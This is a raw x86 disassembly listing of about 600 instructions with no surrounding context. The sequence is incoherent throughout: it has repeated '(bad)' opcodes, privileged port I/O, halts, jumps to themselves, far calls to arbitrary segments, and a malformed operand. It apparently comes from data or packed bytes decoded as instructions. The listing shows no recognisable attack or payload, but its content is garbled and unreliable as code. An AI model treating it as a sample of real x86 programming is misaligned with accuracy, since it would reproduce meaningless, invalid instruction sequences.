  4191a4:	mov    ah,0x6
  4191a6:	mov    BYTE PTR [ecx+0x1ef9d43a],cl
  4191ac:	out    dx,al
  4191ad:	sbb    esi,DWORD PTR [ecx+0x59]
  4191b0:	shl    DWORD PTR ds:0x9f1c1d3c,0xe2
  4191b7:	mov    ecx,0xa54d7a92
  4191bc:	mov    eax,ds:0x7e17a6f4
  4191c1:	push   cs
  4191c2:	push   esi
  4191c3:	cmp    al,0x58
  4191c5:	sub    esp,ecx
  4191c7:	xor    BYTE PTR [edi],cl
  4191c9:	sbb    eax,0xbc6e5c71
  4191ce:	jmp    0x4191ce
  4191d0:	xchg   edi,esi
  4191d2:	leave  
  4191d3:	packuswb mm3,QWORD PTR [ebp+0x3d62a6cb]
  4191da:	and    DWORD PTR [esi+edi*8+0x23bdf5dd],0x8392da35
  4191e5:	dec    ebx
  4191e6:	repz loope 0x4191d9
  4191e9:	sbb    eax,0xc1a35827
  4191ee:	std    
  4191ef:	mov    bh,0xc3
  4191f1:	push   DWORD PTR ss:0x3bc242f0
  4191f8:	repz mov esi,0xf7e260b0
  4191fe:	sub    al,BYTE PTR [ecx+0x6e]
  419201:	mov    esp,0xb171c2bc
  419206:	scas   eax,DWORD PTR es:[edi]
  419207:	fsubr  QWORD PTR [eax+esi*2-0x68]
  41920b:	test   BYTE PTR [esi],cl
  41920d:	hlt    
  41920e:	dec    ah
  419210:	mov    dh,0xe5
  419212:	cwde   
  419213:	and    BYTE PTR [ebp+0x6ca39648],bh
  419219:	gs push ebp
  41921b:	add    dl,dh
  41921d:	or     edi,DWORD PTR [eax]
  41921f:	xor    BYTE PTR [esi],al
  419221:	lock enter 0xff3d,0x10
  419226:	sbb    cl,dl
  419228:	inc    esp
  419229:	neg    DWORD PTR [eax]
  41922b:	dec    ecx
  41922c:	fld    TBYTE PTR [esi+esi*4+0x54]
  419230:	outs   dx,DWORD PTR ds:[esi]
  419231:	out    dx,al
  419232:	scas   al,BYTE PTR es:[edi]
  419233:	inc    esp
  419234:	xchg   ebx,eax
  419235:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419236:	fsub   QWORD PTR [eax+0x49]
  419239:	pusha  
  41923a:	sti    
  41923b:	adc    ch,ch
  41923d:	loopne 0x4191e4
  41923f:	dec    edx
  419240:	test   eax,0x2c44808e
  419245:	in     eax,dx
  419246:	push   0x32
  419248:	xchg   esi,eax
  419249:	loop   0x419215
  41924b:	push   0xffffffd1
  41924d:	inc    ebx
  41924e:	out    dx,al
  41924f:	jbe    0x419272
  419251:	int    0xc4
  419253:	daa    
  419254:	data16 fwait
  419256:	or     ebx,DWORD PTR [esi]
  419258:	mov    edi,0xf7ed9e9f
  41925d:	stos   BYTE PTR es:[edi],al
  41925e:	cdq    
  41925f:	frstor [ebp+0x36]
  419262:	push   cs
  419263:	sbb    cl,al
  419265:	stos   DWORD PTR es:[edi],eax
  419266:	ins    BYTE PTR es:[edi],dx
  419267:	aad    0xc5
  419269:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41926a:	cmp    DWORD PTR [esi-0x73],ebx
  41926d:	(bad)  
  41926e:	in     al,dx
  41926f:	dec    ebx
  419270:	and    ch,BYTE PTR [edi]
  419272:	adc    eax,0x65b9ab30
  419277:	pop    esi
  419278:	int3   
  419279:	aad    0xeb
  41927b:	or     edx,DWORD PTR [ecx]
  41927d:	fcomp  DWORD PTR ds:0x611b3552
  419283:	fnstsw WORD PTR [ebp-0x1eaa517f]
  419289:	js     0x419289
  41928b:	or     BYTE PTR [esi+0x2a],ch
  41928e:	sbb    esp,DWORD PTR [esi+0x33]
  419291:	mov    WORD PTR [ebx+0x21],es
  419294:	cmp    bh,dl
  419296:	mov    ebx,0x1cf52183
  41929b:	inc    edx
  41929c:	(bad)  
  41929d:	fisubr DWORD PTR ds:0x16600adc
  4192a3:	in     eax,0x16
  4192a5:	push   ebp
  4192a6:	dec    ebp
  4192a7:	hlt    
  4192a8:	arpl   WORD PTR [ebx+0x60da241d],dx
  4192ae:	mov    ch,0x3b
  4192b0:	xchg   ecx,eax
  4192b1:	(bad)  
  4192b2:	jp     0x419249
  4192b4:	dec    edx
  4192b5:	popa   
  4192b6:	jne    0x419304
  4192b8:	pop    ds
  4192b9:	int3   
  4192ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192bb:	(bad)  
  4192bd:	sahf   
  4192be:	jno    0x419274
  4192c0:	dec    edi
  4192c1:	inc    BYTE PTR [ebx-0x66ffc8c7]
  4192c7:	dec    esi
  4192c8:	ins    DWORD PTR es:[edi],dx
  4192c9:	mov    bl,0xac
  4192cb:	xor    ah,BYTE PTR [edx-0x57d04615]
  4192d1:	in     eax,0xa9
  4192d3:	out    0xf4,al
  4192d5:	push   edi
  4192d6:	push   0xe55e4d53
  4192db:	dec    esi
  4192dc:	retf   0x998
  4192df:	aad    0x86
  4192e1:	scas   eax,DWORD PTR es:[edi]
  4192e2:	jg     0x4192a8
  4192e4:	sbb    al,0xdf
  4192e6:	scas   eax,DWORD PTR es:[edi]
  4192e7:	bound  ebx,QWORD PTR [ecx+0x56]
  4192ea:	(bad)  
  4192eb:	mov    dh,0x85
  4192ed:	mov    edi,0x8511f003
  4192f2:	arpl   WORD PTR [edx],bp
  4192f4:	xor    al,al
  4192f6:	push   ebx
  4192f7:	in     al,dx
  4192f8:	imul   ecx,DWORD PTR ds:0x6b797af0,0x22
  4192ff:	(bad)  
  419300:	xchg   ecx,eax
  419301:	jp     0x41930d
  419303:	fisttp QWORD PTR [esi+0x74f49214]
  419309:	add    DWORD PTR ds:[edi+ebp*4+0x24440bbd],esi
  419311:	jne    0x419357
  419313:	mov    DWORD PTR [ebp+0x5b],edi
  419316:	xchg   esi,eax
  419317:	(bad)  
  419318:	add    dh,bh
  41931a:	cmp    BYTE PTR [ebx+0x40],ch
  41931d:	cwde   
  41931e:	fild   QWORD PTR [ebp+ebp*8+0x39611b2a]
  419325:	xchg   esp,eax
  419326:	sbb    DWORD PTR [ebx-0x1d8efa4a],edi
  41932c:	fbld   TBYTE PTR [ebp-0x80]
  41932f:	es iret 
  419331:	int3   
  419332:	lods   eax,DWORD PTR ds:[esi]
  419333:	call   0x75b6:0xca3d5621
  41933a:	test   DWORD PTR [esi-0x30cf45b9],ecx
  419340:	call   0x6211b40c
  419345:	cmp    dl,cl
  419347:	push   esi
  419348:	jmp    0xd071028b
  41934d:	jo     0x41937e
  41934f:	mov    esp,0xfb242ee8
  419354:	pop    esi
  419355:	xlat   BYTE PTR ds:[ebx]
  419356:	and    BYTE PTR [ecx+0x11],ah
  419359:	test   ebx,esi
  41935b:	xor    ecx,DWORD PTR [ebp-0x14]
  41935e:	fwait
  41935f:	and    bh,ch
  419361:	push   0x25
  419363:	test   DWORD PTR [esi+0xb27c07e],ebp
  419369:	fwait
  41936a:	add    al,0x44
  41936c:	scas   eax,DWORD PTR es:[edi]
  41936d:	retf   
  41936e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41936f:	retf   
  419370:	jecxz  0x41936f
  419372:	push   0xffffffaa
  419374:	or     eax,0xb542b635
  419379:	sub    eax,0x51b43185
  41937e:	and    BYTE PTR [edx+0x657d3500],dl
  419384:	xor    BYTE PTR [edx+0x7d7e2d1a],ah
  41938a:	jnp    0x4193c2
  41938c:	jns    0x419388
  41938e:	mov    esp,0xad02940a
  419393:	fs dec ebp
  419395:	idiv   BYTE PTR [ebx]
  419397:	cmp    DWORD PTR [eax-0x75],0x49db4a80
  41939e:	call   0x105d:0xc574864a
  4193a5:	dec    edi
  4193a6:	adc    ebx,DWORD PTR [edi+0x0]
  4193a9:	ret    
  4193aa:	cmp    DWORD PTR [eax-0x3e09cc87],ecx
  4193b0:	(bad)  
  4193b1:	scas   al,BYTE PTR es:[edi]
  4193b2:	fisubr DWORD PTR [edx+0x50]
  4193b5:	jbe    0x419426
  4193b7:	jmp    0xac528526
  4193bc:	test   eax,0x60539612
  4193c1:	add    al,ch
  4193c3:	mov    BYTE PTR [edi],bh
  4193c5:	or     eax,0xb5be6686
  4193ca:	dec    edx
  4193cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193cc:	cmp    eax,0x791a21f0
  4193d1:	aam    0x68
  4193d3:	rol    DWORD PTR [esi+0x55d9dd7],1
  4193d9:	adc    DWORD PTR [esi-0x69],edx
  4193dc:	shl    DWORD PTR [ecx],cl
  4193de:	mov    cl,0x22
  4193e0:	adc    eax,0x47fc71ce
  4193e5:	jmp    0xfebd:0x89e3321e
  4193ec:	ret    
  4193ed:	aas    
  4193ee:	inc    eax
  4193ef:	jge    0x4193ca
  4193f1:	shl    BYTE PTR [edi+ebx*1-0x48],0xa0
  4193f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193f7:	sti    
  4193f8:	pop    ecx
  4193f9:	pop    ebp
  4193fa:	jno    0x419450
  4193fc:	fnstsw WORD PTR [ebp+0x68cbff99]
  419402:	bound  esp,QWORD PTR ds:0x84b9bea4
  419408:	fisub  WORD PTR [esi+0x3d67d16b]
  41940e:	pop    esi
  41940f:	and    ecx,ecx
  419411:	sub    esi,edx
  419413:	jp     0x419442
  419415:	xor    BYTE PTR [edi+0x41eafe0e],dh
  41941b:	xor    ch,al
  41941d:	inc    ebp
  41941e:	xchg   esp,eax
  41941f:	and    al,0xad
  419421:	mov    edi,0xa10e2c0b
  419426:	mov    esp,0x6670b369
  41942b:	inc    edi
  41942c:	inc    ecx
  41942d:	leave  
  41942e:	inc    esp
  41942f:	add    dl,BYTE PTR [esi-0x2c]
  419432:	icebp  
  419433:	fwait
  419434:	pop    ebp
  419435:	outs   dx,BYTE PTR ds:[esi]
  419436:	xor    al,0xc5
  419438:	push   es
  419439:	pop    edx
  41943a:	sub    esp,DWORD PTR [esi]
  41943c:	jmp    0xefe2cd10
  419441:	push   ebx
  419442:	sbb    cl,ah
  419444:	dec    edi
  419445:	(bad)  
  419446:	popa   
  419447:	fstp   TBYTE PTR [edi]
  419449:	jl     0x4193f4
  41944b:	or     ebx,DWORD PTR [ecx-0x23]
  41944e:	outs   dx,BYTE PTR ds:[esi]
  41944f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419450:	scas   al,BYTE PTR es:[edi]
  419451:	sbb    BYTE PTR [ecx+0x4e],cl
  419454:	(bad)  
  419456:	push   0x3ed0fba5
  41945b:	es in  eax,dx
  41945d:	pop    ds
  41945e:	rcl    BYTE PTR [edx+0x595bd0c5],0x7
  419465:	and    DWORD PTR [ecx],ebp
  419467:	jmp    0x53f0c8c5
  41946c:	sub    BYTE PTR [edx],bl
  41946e:	push   eax
  41946f:	mov    eax,0xa63a7450
  419474:	test   eax,0x2816acdb
  419479:	call   0x9d47:0x54c26b2e
  419480:	xor    DWORD PTR [ebp+0x7d],ebx
  419483:	jns    0x419413
  419485:	imul   edi,DWORD PTR [eax+0x63f97916],0x73
  41948c:	ins    DWORD PTR es:[edi],dx
  41948d:	pop    ds
  41948e:	or     BYTE PTR [edx+0x36],bh
  419491:	mov    ebp,0x1be89a84
  419496:	cdq    
  419497:	mov    ch,0x43
  419499:	ja     0x41950c
  41949b:	inc    esp
  41949c:	dec    eax
  41949d:	int    0x96
  41949f:	mov    BYTE PTR [edx],ch
  4194a1:	sub    BYTE PTR ds:0xf5adf8d7,bl
  4194a7:	mov    edi,0x6863ca01
  4194ac:	or     DWORD PTR [esi],edx
  4194ae:	sub    eax,0xdb24957b
  4194b3:	(bad)  
  4194b4:	ficom  WORD PTR [eax]
  4194b6:	int3   
  4194b7:	cmp    ebx,DWORD PTR [edi+0x37]
  4194ba:	lods   al,BYTE PTR ds:[esi]
  4194bb:	scas   eax,DWORD PTR es:[edi]
  4194bc:	or     eax,0xe8479698
  4194c1:	push   ss
  4194c2:	in     eax,dx
  4194c3:	addr16 push edx
  4194c5:	inc    eax
  4194c6:	cmp    eax,0x5d80be55
  4194cb:	in     al,dx
  4194cc:	add    edx,DWORD PTR [ecx+0x304338]
  4194d2:	shr    DWORD PTR [ecx],cl
  4194d4:	sbb    al,0x9e
  4194d6:	cmp    al,0x14
  4194d8:	pop    ss
  4194d9:	cmp    al,0x10
  4194db:	fdiv   QWORD PTR [edi+0x6f]
  4194de:	inc    esi
  4194df:	in     eax,dx
  4194e0:	sbb    al,0x41
  4194e2:	mov    edi,0xab8c6e41
  4194e7:	mov    ebx,0x163d8d00
  4194ec:	mov    bh,0x9b
  4194ee:	push   0x59
  4194f0:	or     al,0x3b
  4194f2:	clc    
  4194f3:	jmp    0x4194fe
  4194f5:	xor    bh,bh
  4194f7:	mov    edi,0x70e5ad1b
  4194fc:	mov    ah,0xf2
  4194fe:	sbb    DWORD PTR [edx-0x21f2467d],edi
  419504:	ins    BYTE PTR es:[edi],dx
  419505:	bound  ebx,QWORD PTR [ebp+0x14c96722]
  41950b:	dec    ebp
  41950c:	pushf  
  41950d:	jmp    0x419575
  41950f:	lds    ebp,FWORD PTR fs:[edi-0x7b]
  419513:	dec    esi
  419514:	iret   
  419515:	adc    BYTE PTR [edx+0x73],ch
  419518:	loope  0x419510
  41951a:	xchg   edi,eax
  41951b:	inc    ebx
  41951c:	test   eax,0xa1fa4e59
  419521:	adc    al,0x63
  419523:	daa    
  419524:	jmp    0x41956a
  419526:	dec    ebx
  419527:	sbb    esp,eax
  419529:	jmp    0x419546
  41952b:	pop    es
  41952c:	mov    dl,0x71
  41952e:	xchg   ecx,eax
  41952f:	add    BYTE PTR [esi],bh
  419531:	leave  
  419532:	test   bl,ah
  419534:	(bad)  
  419535:	xor    esp,DWORD PTR [edi-0x4e]
  419538:	mov    ebp,0xfca7d1c0
  41953d:	in     al,0x22
  41953f:	adc    ebp,esp
  419541:	mov    ebx,0xaa00df19
  419546:	xor    edi,0x12
  419549:	stos   DWORD PTR es:[edi],eax
  41954a:	icebp  
  41954b:	mov    bl,0xa1
  41954d:	in     al,0x65
  41954f:	call   0xd0b8:0xe818b8f1
  419556:	and    edi,DWORD PTR [eax-0xe]
  419559:	push   es
  41955a:	pusha  
  41955b:	mov    eax,ds:0xafed9f04
  419560:	cmp    BYTE PTR ds:0xaffdb6ba,ah
  419566:	mov    edx,0x2724b549
  41956b:	sahf   
  41956c:	pop    esi
  41956d:	imul   edi,edi,0x5c
  419570:	inc    esp
  419571:	pop    ebp
  419572:	clc    
  419573:	cmp    eax,0x20372a7c
  419578:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419579:	stc    
  41957a:	call   0x22c8:0x99ff2823
  419581:	stos   DWORD PTR es:[edi],eax
  419582:	jno    0x419547
  419584:	fnstcw WORD PTR [edx-0x14]
  419587:	(bad)  
  419588:	addr16 cli 
  41958a:	mov    cl,0xbe
  41958c:	and    al,BYTE PTR [ecx+0x78ca8d0e]
  419592:	xchg   edi,eax
  419593:	les    ebp,FWORD PTR [edx-0x6b]
  419596:	push   esp
  419597:	das    
  419598:	outs   dx,BYTE PTR ds:[esi]
  419599:	ds inc eax
  41959b:	in     al,0x44
  41959d:	fdiv   st(3),st
  41959f:	or     DWORD PTR [ebx+0x24c8b10f],ebx
  4195a5:	xchg   DWORD PTR [ebx],edx
  4195a7:	sbb    eax,0x395517d7
  4195ac:	pop    ecx
  4195ad:	scas   eax,DWORD PTR es:[edi]
  4195ae:	xlat   BYTE PTR ds:[ebx]
  4195af:	cwde   
  4195b0:	adc    ch,dl
  4195b2:	(bad)  
  4195b3:	out    0x88,eax
  4195b5:	test   eax,0x41fb807f
  4195ba:	ja     0x41962e
  4195bc:	jne    0x41957e
  4195be:	or     edx,DWORD PTR [eax+esi*2]
  4195c1:	add    DWORD PTR [ecx-0x642a45bd],ecx
  4195c7:	lods   al,BYTE PTR ds:[esi]
  4195c8:	mov    edi,0x42c91d46
  4195cd:	jnp    0x4195d8
  4195cf:	imul   eax,DWORD PTR [edx-0x1d29126d],0xffffffd1
  4195d6:	cmp    al,0xe2
  4195d8:	add    al,0x53
  4195da:	fnstenv [ebx-0x19]
  4195dd:	je     0x419589
  4195df:	sar    DWORD PTR [edx+ebx*2-0x3ea01fce],0x21
  4195e7:	ror    BYTE PTR [eax+0x355f0050],0x27
  4195ee:	add    al,0x45
  4195f0:	clc    
  4195f1:	retf   0x253a
  4195f4:	push   ebx
  4195f5:	jno    0x41957c
  4195f7:	mov    WORD PTR [edx-0x64],?
  4195fa:	stos   DWORD PTR es:[edi],eax
  4195fb:	(bad)  
  4195fc:	pop    edx
  4195fd:	push   esp
  4195fe:	mov    eax,ds:0x1749d267
  419603:	xor    DWORD PTR [edi+0x16],0xf2e0238d
  41960a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41960b:	out    dx,eax
  41960c:	(bad)  
  41960d:	push   0x9cda2d72
  419612:	repz jo 0x41963c
  419615:	mov    ss,WORD PTR [edi+0x3aa2fa45]
  41961b:	push   edi
  41961c:	mov    ecx,0xa7c0784a
  419621:	push   ss
  419622:	ret    
  419623:	cld    
  419624:	or     eax,DWORD PTR [ebp-0x56]
  419627:	cmp    eax,0x48699704
  41962c:	or     bh,BYTE PTR [esi]
  41962e:	sar    BYTE PTR [edx+0x3a57f9d3],0xe5
  419635:	dec    eax
  419636:	outs   dx,BYTE PTR ds:[esi]
  419637:	inc    edi
  419638:	jbe    0x4195e7
  41963a:	jo     0x419607
  41963c:	cdq    
  41963d:	or     BYTE PTR [ebp-0x51a3a41f],ch
  419643:	fldcw  WORD PTR [esi]
  419645:	sbb    BYTE PTR [edi],ch
  419647:	fcmovnb st,st(0)
  419649:	sar    DWORD PTR [edi],0xd3
  41964c:	and    DWORD PTR [esi],edi
  41964e:	and    al,0x13
  419650:	retf   0x57b5
  419653:	inc    ebp
  419654:	pusha  
  419655:	(bad)  [ecx+0x74e1cbc6]
  41965b:	fist   WORD PTR [edx]
  41965d:	out    0x75,al
  41965f:	xor    DWORD PTR [ecx+0x2f],eax
  419662:	mov    dh,bl
  419664:	mov    al,0x86
  419666:	ja     0x41968b
  419668:	pushf  
  419669:	inc    edi
  41966a:	and    eax,0xd87ee246
  41966f:	fsub   QWORD PTR [edi+eiz*8-0x204a3493]
  419676:	xor    edi,edi
  419678:	loop   0x41967c
  41967a:	cwde   
  41967b:	xor    al,0x2b
  41967d:	mov    gs,eax
  41967f:	repz pop esi
  419681:	push   edi
  419682:	not    DWORD PTR [esi+ebx*4]
  419685:	daa    
  419686:	add    DWORD PTR [edi-0x6d5ef54c],eax
  41968c:	fsubr  DWORD PTR [ebx]
  41968e:	jno    0x419645
  419690:	int    0x3d
  419692:	(bad)  
  419693:	xchg   esp,eax
  419694:	int    0xfc
  419696:	(bad)  
  419697:	mov    al,ds:0x58dd462
  41969c:	xor    cl,BYTE PTR [eax]
  41969e:	and    DWORD PTR [edx+0x4278c53a],edx
  4196a4:	ret    
  4196a5:	in     al,dx
  4196a6:	push   ecx
  4196a7:	int3   
  4196a8:	jo     0x419690
  4196aa:	inc    ebx
  4196ab:	add    edx,DWORD PTR ds:0xbeb0e4d1
  4196b1:	jnp    0x419711
  4196b3:	cwde   
  4196b4:	sub    bl,BYTE PTR [edi+0x19]
  4196b7:	and    al,0xd9
  4196b9:	xchg   edx,eax
  4196ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196bb:	sub    ebx,DWORD PTR [ecx]
  4196bd:	iret   
  4196be:	or     DWORD PTR [eax],ebx
  4196c0:	les    esp,FWORD PTR [ebx+0x41a31b1e]
  4196c6:	sub    ah,BYTE PTR [edi+0x55]
  4196c9:	jns    0x4196af
  4196cb:	inc    edi
  4196cc:	push   ebx
  4196cd:	scas   eax,DWORD PTR es:[edi]
  4196ce:	xchg   ebx,eax
  4196cf:	inc    edx
  4196d0:	cld    
  4196d1:	pop    eax
  4196d2:	cmp    eax,0xe9cc6048
  4196d7:	mov    eax,0x52907500
  4196dc:	fistp  WORD PTR [ebx+0x7e]
  4196df:	mov    ecx,0x6bd0e67a
  4196e4:	popa   
  4196e5:	push   ss
  4196e6:	and    DWORD PTR [eax+0x52bdfb2],esp
  4196ec:	dec    edx
  4196ed:	push   0x7
  4196ef:	fidiv  DWORD PTR [ebx]
  4196f1:	fiadd  WORD PTR [edi+0x6]
  4196f4:	lock add edx,0xffffffdf
  4196f8:	gs in  eax,dx
  4196fa:	push   edx
  4196fb:	jae    0x419749
  4196fd:	cmc    
  4196fe:	mov    ds:0x941574b4,eax
  419703:	lods   eax,DWORD PTR ds:[esi]
  419704:	fldcw  WORD PTR [ebx-0x4a7527e4]
  41970a:	(bad)  
  41970b:	(bad)  
  41970c:	out    dx,al
  41970d:	or     cl,dl
  41970f:	ret    0x4e89
  419712:	xor    ah,BYTE PTR [ecx+ecx*1-0x3a]
  419716:	mov    edx,0xad31e45c
  41971b:	pop    edx
  41971c:	inc    edi
  41971d:	cmp    ah,BYTE PTR ds:0x2dddf39f
  419723:	stc    
  419724:	stc    
  419725:	mov    BYTE PTR [esi-0x1d1de599],ch
  41972b:	mov    BYTE PTR [ebx],ch
  41972d:	jge    0x419734
  41972f:	sbb    bl,BYTE PTR [edi+0x10fa74d6]
  419735:	enter  0x486b,0x99
  419739:	or     BYTE PTR [edi],ah
  41973b:	mov    ecx,DWORD PTR [ecx+ebp*4-0x6f]
  41973f:	add    ah,ch
  419741:	rcl    BYTE PTR [eax-0x38],cl
  419744:	dec    esp
  419745:	pop    ecx
  419746:	ins    DWORD PTR es:[edi],dx
  419747:	in     al,dx
  419748:	mov    ebx,fs
  41974a:	imul   edi,ebx,0x62ff1260
  419750:	jmp    0x4d50:0x709e7dbd
  419757:	push   cs
  419758:	mov    cl,0x68
  41975a:	js     0x419767
  41975c:	and    al,0x60
  41975e:	lds    ebx,FWORD PTR [ebp+0x47]
  419761:	sub    BYTE PTR [edi],bl
  419763:	unpcklps xmm1,XMMWORD PTR [ebx]
  419766:	jno    0x4197a1
  419768:	test   DWORD PTR [edi],edi
  41976a:	adc    DWORD PTR [ecx-0x40],0xffffff93
  41976e:	jno    0x41974f
  419770:	int3   
  419771:	lods   eax,DWORD PTR ds:[esi]
  419772:	ds ret 
  419774:	scas   eax,DWORD PTR es:[edi]
  419775:	iret   
  419776:	pop    es
  419777:	jae    0x41979c
  419779:	adc    DWORD PTR [edx-0x1d],0x3783eec7
  419780:	jmp    0xaba1:0xc8b61404
  419787:	cmp    BYTE PTR [edi+edx*1+0x7b],ch
  41978b:	loope  0x41974e
  41978d:	sub    DWORD PTR [ebx-0x71717b96],ecx
  419793:	adc    ecx,DWORD PTR [ebx+0x5cb9696b]
  419799:	xchg   edx,eax
  41979a:	xor    DWORD PTR [ebx],ebp
  41979c:	mov    ecx,0x40c93408
  4197a1:	xor    edi,DWORD PTR [eax]
  4197a3:	xchg   ebx,eax
  4197a4:	push   0x11
  4197a6:	ins    DWORD PTR es:[edi],dx
  4197a7:	call   0xbcec:0xd3141166
  4197ae:	ins    BYTE PTR es:[edi],dx
  4197af:	jmp    DWORD PTR [ebx]
  4197b1:	cmp    ch,bl
  4197b3:	inc    edi
  4197b4:	gs or  bh,ah
  4197b7:	and    DWORD PTR [ebp+eiz*4-0x3441e7a0],0xceff8dcc
  4197c2:	and    eax,0x541e81a9
  4197c7:	out    0x59,eax
  4197c9:	cmp    dh,dh
  4197cb:	xor    DWORD PTR [edx-0x4a],ecx
  4197ce:	sbb    bl,BYTE PTR [ebx+0x31529cee]
  4197d4:	push   esp
  4197d5:	fiadd  WORD PTR [eax]
  4197d7:	push   ebp
  4197d8:	adc    DWORD PTR ss:[edi],0xffffff8a
  4197dc:	xrelease mov DWORD PTR [esi+edi*4-0x1bc96421],esi
  4197e4:	sbb    al,cl
  4197e6:	lods   eax,DWORD PTR ds:[esi]
  4197e7:	jmp    0x4197f2
  4197e9:	mov    ah,0x8c
  4197eb:	jo     0x41983e
  4197ed:	rcl    BYTE PTR [ebp+eiz*2+0x6c],1
  4197f1:	imul   edi,DWORD PTR [esi-0x7ebc1d2d],0x3bfe4c6e
  4197fb:	fcmovu st,st(1)
  4197fd:	cld    
  4197fe:	jo     0x419857
  419800:	aam    0xdc
  419802:	les    edx,FWORD PTR [esi+0x7a5a832b]
  419808:	pop    ebx
  419809:	or     eax,0x4ee572dc
  41980e:	xchg   edx,eax
  41980f:	mov    ah,0xa5
  419811:	(bad)  
  419813:	add    DWORD PTR [edi],esi
  419815:	inc    edi
  419816:	add    dl,BYTE PTR [eax-0x2c]
  419819:	push   ecx
  41981a:	xor    ah,BYTE PTR [esi-0x20cd9d4d]
  419820:	cli    
  419821:	das    
  419822:	sbb    DWORD PTR [eax+0x6ddc353d],ebp
  419828:	xchg   ebx,eax
  419829:	xchg   esp,eax
  41982a:	jb     0x419850
  41982c:	call   0xd8cc4380
  419831:	frstor [eax]
  419833:	xor    eax,0x72a069f
  419838:	in     eax,0xd8
  41983a:	shl    BYTE PTR [ecx],1
  41983c:	test   bh,cl
  41983e:	xchg   edi,eax
  41983f:	out    0x1a,eax
  419841:	and    al,0xa1
  419843:	mov    eax,ds:0x18f72bc1
  419848:	not    DWORD PTR ds:0xd7e0b4bf
  41984e:	mov    dh,0x87
  419850:	inc    eax
  419851:	sahf   
  419852:	sub    BYTE PTR [ecx+0x5],dh
  419855:	push   ecx
  419856:	cmp    BYTE PTR [edx+ecx*8],0xb0
  41985a:	enter  0x9658,0x1f
  41985e:	mov    esp,0x8bef504
  419863:	push   edx
  419864:	sub    ebp,eax
  419866:	pop    edi
  419867:	dec    ebx
  419868:	mov    bl,0xe8
  41986a:	scas   al,BYTE PTR es:[edi]
  41986b:	nop
  41986c:	mov    bh,0xbb
  41986e:	in     al,dx
  41986f:	sar    ah,1
  419871:	das    
  419872:	xchg   ebp,eax
  419873:	ret    
  419874:	xor    al,0x4
  419876:	pop    eax
  419877:	inc    edx
  419878:	xchg   dh,ch
  41987a:	mov    bl,0x60
  41987c:	mov    al,ds:0x9868f6b0
  419881:	xchg   ebx,eax
  419882:	dec    esi
  419883:	or     dl,0x78
  419886:	or     eax,0xf738cf3d
  41988b:	sbb    al,0x68
  41988d:	sub    cl,BYTE PTR [edi+ecx*4+0x35]
  419891:	mov    ah,0xde
  419893:	sbb    DWORD PTR [ebp+edi*4+0x45],ecx
  419897:	pop    DWORD PTR [edx+eax*1-0x627e3d3e]
  41989e:	gs ins DWORD PTR es:[edi],dx
  4198a0:	push   cs
  4198a1:	cmp    BYTE PTR [esi+0x1c312c8],dh
  4198a7:	sahf   
  4198a8:	mov    BYTE PTR [eax-0x22f9b96a],dl
  4198ae:	daa    
  4198af:	loope  0x419849
  4198b1:	jbe    0x4198a1
  4198b3:	lods   eax,DWORD PTR ds:[esi]
  4198b4:	scas   eax,DWORD PTR es:[edi]
  4198b5:	add    dh,bh
  4198b7:	cmp    DWORD PTR [ebx-0x469c3794],esp
  4198bd:	(bad)  
  4198bf:	push   0xffffffd1
  4198c1:	shr    BYTE PTR [edx+edi*1+0x16],0x9b
  4198c6:	fisttp DWORD PTR ss:[edi-0x68cc36f8]
  4198cd:	xor    eax,0x8f63029d
  4198d2:	loopne 0x4198eb
  4198d4:	xchg   esp,eax
  4198d5:	fadd   DWORD PTR [esi+esi*1+0x7c5ddb2e]
  4198dc:	mov    ecx,esi
  4198de:	jno    0x4198d9
  4198e0:	cld    
  4198e1:	adc    edi,edx
  4198e3:	cmp    ecx,DWORD PTR [edi-0x75c3ca80]
  4198e9:	outs   dx,BYTE PTR ds:[esi]
  4198ea:	xor    eax,0xc376a3ad
  4198ef:	cs add bl,dh
  4198f2:	mov    ah,BYTE PTR [eax+0xf]
  4198f5:	retf   0xa20
  4198f8:	mov    eax,ds:0x7d562f40
  4198fd:	std    
  4198fe:	(bad)  
  4198ff:	or     al,0xb7
  419901:	scas   eax,DWORD PTR es:[edi]
  419902:	inc    ecx
  419903:	mov    eax,0x6a243394
  419908:	popf   
  419909:	outs   dx,DWORD PTR ds:[esi]
  41990a:	dec    ecx
  41990b:	fs mov esp,0x155aa7c5
  419911:	ss (bad) 
  419913:	cdq    
  419914:	and    al,0x8e
  419916:	inc    ecx
  419917:	cdq    
  419918:	stos   DWORD PTR es:[edi],eax
  419919:	inc    esi
  41991a:	cmovae esi,DWORD PTR [eax-0x237ca35b]
  419921:	imul   edi,eax,0x207fcf4
  419927:	popf   
  419928:	push   esi
  419929:	push   eax
  41992a:	and    al,0x4b
  41992c:	dec    edi
  41992d:	and    dl,BYTE PTR [eax-0x2b]
  419930:	sbb    al,BYTE PTR [eax]
  419932:	adc    eax,0xf9dc2654
  419937:	aam    0x64
  419939:	inc    ecx
  41993a:	pop    es
  41993b:	cwde   
  41993c:	dec    esi
  41993d:	sar    ah,1
  41993f:	xor    al,0xd5
  419941:	push   DWORD PTR [ecx+0x1207438]
  419947:	push   esp
  419948:	pop    ss
  419949:	cmp    esp,ebp
  41994b:	sbb    ch,BYTE PTR [edx+0x2fb7ec9]
  419951:	cmp    DWORD PTR [eax],eax
  419953:	shl    BYTE PTR [ecx],1
  419955:	mov    bl,0xdb
  419957:	js     0x41999b
  419959:	mov    eax,ds:0xc14ef707
  41995e:	push   0xaf0d8042
  419963:	sbb    DWORD PTR [eax+0x3c],ebx
  419966:	push   esi
  419967:	mov    ch,0x57
  419969:	jne    0x41991c
  41996b:	arpl   bx,bx
  41996d:	add    al,0xb7
  41996f:	stc    
  419970:	jbe    0x419975
  419972:	jbe    0x419954
  419974:	sub    esi,DWORD PTR [ebp-0x17b4165f]
  41997a:	enter  0x7fd4,0x3c
  41997e:	sbb    BYTE PTR [ecx-0x1f],0xdf
  419982:	pop    edx
  419983:	mov    ebx,0x667185
  419988:	push   ecx
  419989:	inc    edx
  41998a:	mov    esi,0xd7d80204
